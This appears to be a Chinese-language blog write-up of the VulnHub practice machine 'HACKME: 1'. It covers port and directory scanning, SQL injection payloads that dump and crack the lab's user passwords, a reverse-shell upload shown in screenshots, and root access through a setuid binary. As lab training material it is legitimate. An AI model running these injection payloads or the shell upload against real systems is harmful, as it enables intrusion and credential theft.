---
title: Hackme 
date: 2024-03-18  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Hackme.html"
---

# HACKME: 1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822529.png" alt="image-20240318132902325" style="zoom:50%;" />

尝试扫一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822532.png" alt="image-20240318161109567" style="zoom: 50%;" />

这个应该是的！🐓开始！

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.37.132 -- -A -sV 
```

```text
Open 192.168.37.132:22
Open 192.168.37.132:80
```

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0KQXcUd/+zfBtJFhP+25xVD0f+ujGrlKTw/Ho8wy41nYgrtyHiiscKmJUv7XKAfjC8YImead1E+okzuRvpT1HX3l1xMwfWboty0V3IezTFxYIpUPmqejoC9uSsKxpd5h+vDRwchjCQGZpumuei5QT+OyY7XpdUB3P/lica+QEO2Af4ZFmeOOizRYvabosnbg2rGObbkTbMZVcGdL67ECncSRP5mcjH2cnXqAAiDEs+F9YtR0oRVX8+SqaVXLqrNzIeZxqH8BW1f0O4SPq5tsHiYbCco4yb9iMgnX1EPd981wt40+6D0N3BB1QYciv6RAS4fKCP+Akk2c4tThBGm7t
|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKTgFkEMmekHRtPsKN9f6w7/m1ih/8MraIwM4yIy5/hRW8ct1Ghc6YnhhI0KJGYF6KYiCgyKK97mVEpBVf98O5w=
|   256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPEwLR2lULYITB1F789nQ/INIXH6NhMCHK25Z3pJquX
80/tcp open  http    syn-ack Apache httpd 2.4.34 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.34 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

发现打开了`80`端口，尝试进行扫描：

```bash
gobuster dir -u http://192.168.37.132 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirb/common.txt -f -t 50
```

```text
/.hta/                (Status: 403) [Size: 294]
/.hta.zip/            (Status: 403) [Size: 298]
/.hta.html/           (Status: 403) [Size: 299]
/.hta.txt/            (Status: 403) [Size: 298]
/.hta.php/            (Status: 403) [Size: 298]
/.hta.bak/            (Status: 403) [Size: 298]
/.htaccess.html/      (Status: 403) [Size: 304]
/.htaccess.php/       (Status: 403) [Size: 303]
/.htaccess.txt/       (Status: 403) [Size: 303]
/.htaccess.bak/       (Status: 403) [Size: 303]
/.htaccess/           (Status: 403) [Size: 299]
/.htaccess.zip/       (Status: 403) [Size: 303]
/.htpasswd/           (Status: 403) [Size: 299]
/.htpasswd.bak/       (Status: 403) [Size: 303]
/.htpasswd.zip/       (Status: 403) [Size: 303]
/.htpasswd.php/       (Status: 403) [Size: 303]
/.htpasswd.html/      (Status: 403) [Size: 304]
/.htpasswd.txt/       (Status: 403) [Size: 303]
/.php/                (Status: 403) [Size: 294]
/.html/               (Status: 403) [Size: 295]
/config.php/          (Status: 200) [Size: 0]
/icons/               (Status: 403) [Size: 295]
/index.php/           (Status: 200) [Size: 100]
/index.php/           (Status: 200) [Size: 100]
/login.php/           (Status: 200) [Size: 1246]
/logout.php/          (Status: 302) [Size: 0] [--> login.php]
/register.php/        (Status: 200) [Size: 1938]
/server-status/       (Status: 403) [Size: 303]
/uploads/             (Status: 200) [Size: 941]
/welcome.php/         (Status: 302) [Size: 0] [--> login.php]

```

## 漏洞利用

### 先实地考察一下

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822534.png" alt="image-20240318163544136" style="zoom:50%;" />

尝试一下常见的万能密码和弱密码，似乎不行，但是有回显：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822535.png" alt="image-20240318163756807" style="zoom:33%;" />

注册一个账号吧：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822536.png" alt="image-20240318163957896" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822537.png" alt="image-20240318164129837" style="zoom:50%;" />

### sql注入

进来了，尝试看一下有没有漏洞，不过不管输入啥，都会弹回来，尝试抓包看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822538.png" alt="image-20240318164920984" style="zoom:50%;" />

尝试注入一下：

```sql
search=ctf' or 1=1 -- -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822539.png" alt="image-20240318165209049" style="zoom:33%;" />

我擦，砖业啊！！！再查询一下：

```bash
search=ctf' union select database(),2,3-- -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822540.png" alt="image-20240318170939395" style="zoom:33%;" />

获得了数据库名称，继续：

```bash
search=ctf' union select @@version,2,3 -- -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822541.png" alt="image-20240318171148161" style="zoom:33%;" />

获取到了版本，继续：

```bash
search=ctf' union select schema_name,2,3 from information_schema.schemate -- -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822542.png" alt="image-20240318171609446" style="zoom:33%;" />

发现打错了，哈哈哈

```bash
search=ctf' union select schema_name,2,3 from information_schema.schemata -- -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822543.png" alt="image-20240318173702625" style="zoom:50%;" />

继续查询：

```bash
# 查询当前数据库表名
search=ctf' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
# 查询users表所有列名
search=ctf' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()#
# 查询users表的所有列值
search=ctf' union select 1,group_concat(user),group_concat(pasword) from users#
```

![image-20240318174010267](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822544.png)

![image-20240318174055349](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822545.png)

![image-20240318174133779](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822546.png)

```apl
user1					5d41402abc4b2a76b9719d911017c592
user2					6269c4f71a55b24bad0f0267d9be5508
user3					0f359740bd1cda994f8b55330c86d845
test					05a671c66aefea124cc08b76ea6d30bb
superadmin				2386acb2cf356944177746fc92523983
test1					05a671c66aefea124cc08b76ea6d30bb
ad						5f4dcc3b5aa765d61d8327deb882
```

解密一下：https://www.somd5.com/

```apl
user1					hello
user2					commando
user3					p@ssw0rd
test					testtest
superadmin				Uncrackable
test1					testtest
ad						password
```

使用超级用户进行登录看看是不是真的`super`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822547.png" alt="image-20240318175132740" style="zoom:50%;" />

### 上传反弹shell

我擦，牛逼，有个可以上传文件的地方！尝试上传一个反弹shell：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822548.png" alt="image-20240318175624438" style="zoom:50%;" />

等他转完，再尝试连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822549.png" alt="image-20240318175729461" style="zoom:50%;" />

go！！！

![image-20240318175816312](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822550.png)



shell弹过来了。

## 提权

### 信息搜集

```bash
$ uname -a
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
$ find / -perm -u=s -type f 2>/dev/null                                    
/snap/core/16928/bin/mount                                                 
/snap/core/16928/bin/ping                                                  
/snap/core/16928/bin/ping6                                                 
/snap/core/16928/bin/su                                                    
/snap/core/16928/bin/umount                                                
/snap/core/16928/usr/bin/chfn
/snap/core/16928/usr/bin/chsh
/snap/core/16928/usr/bin/gpasswd
/snap/core/16928/usr/bin/newgrp
/snap/core/16928/usr/bin/passwd
/snap/core/16928/usr/bin/sudo
/snap/core/16928/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/16928/usr/lib/openssh/ssh-keysign
/snap/core/16928/usr/lib/snapd/snap-confine
/snap/core/16928/usr/sbin/pppd
/snap/core22/1122/usr/bin/chfn
/snap/core22/1122/usr/bin/chsh
/snap/core22/1122/usr/bin/gpasswd
/snap/core22/1122/usr/bin/mount
/snap/core22/1122/usr/bin/newgrp
/snap/core22/1122/usr/bin/passwd
/snap/core22/1122/usr/bin/su
/snap/core22/1122/usr/bin/sudo
/snap/core22/1122/usr/bin/umount
/snap/core22/1122/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/1122/usr/lib/openssh/ssh-keysign
/snap/core22/1122/usr/libexec/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudo
/home/legacy/touchmenot
/bin/mount
/bin/umount
/bin/ping
/bin/ntfs-3g
/bin/su
/bin/fusermount
$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

看到一处奇怪的`suid`：

```bash
/home/legacy/touchmenot
```

分析一下：

```bash
$ cd /home
$ ls
hackme
legacy
$ cd hackme
$ ls
$ ls -la
total 48
drwxr-xr-x 5 hackme hackme 4096 Mar 25  2019 .
drwxr-xr-x 4 root   root   4096 Mar 26  2019 ..
-rw------- 1 hackme hackme 5794 Mar 27  2019 .bash_history
-rw-r--r-- 1 hackme hackme  220 Sep 12  2018 .bash_logout
-rw-r--r-- 1 hackme hackme 3771 Sep 12  2018 .bashrc
drwx------ 2 hackme hackme 4096 Mar 13  2019 .cache
drwx------ 3 hackme hackme 4096 Mar 13  2019 .gnupg
drwxrwxr-x 3 hackme hackme 4096 Mar 21  2019 .local
-rw------- 1 root   root   5588 Mar 25  2019 .mysql_history
-rw-r--r-- 1 hackme hackme  807 Sep 12  2018 .profile
-rw-r--r-- 1 hackme hackme    0 Mar 13  2019 .sudo_as_admin_successful
$ cd ../legacy
$ ls -la
total 20
drwxr-xr-x 2 root root 4096 Mar 26  2019 .
drwxr-xr-x 4 root root 4096 Mar 26  2019 ..
-rwsr--r-x 1 root root 8472 Mar 26  2019 touchmenot
$ file touchmenot
touchmenot: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3ff194cb73ad46fb725445a4a8992494e7110a1c, not stripped
$ strings touchmenot
/bin/sh: 14: strings: not found
$ objdump -d touchmenot
/bin/sh: 16: objdump: not found
$ ./touchmenot
whoami;id
root
uid=0(root) gid=33(www-data) groups=33(www-data)
```

奇奇怪怪的，莫名其妙就拿到了`root`。

## 分析一下程序

先传过来：

```
nc -l 8899 < touchmenot
nc 192.168.37.132 8899 > touchroot
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822551.png" alt="image-20240318181823096" style="zoom: 33%;" />

拿出来分析一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403181822552.png" alt="image-20240318182035534" style="zoom:50%;" />

行吧，就是一个脚本，将当前用户设置为`root`用户，以后的命令均基于此，然后以`root`用户启动一个`bash`的shell，所以我们直接就get到了root！！！！

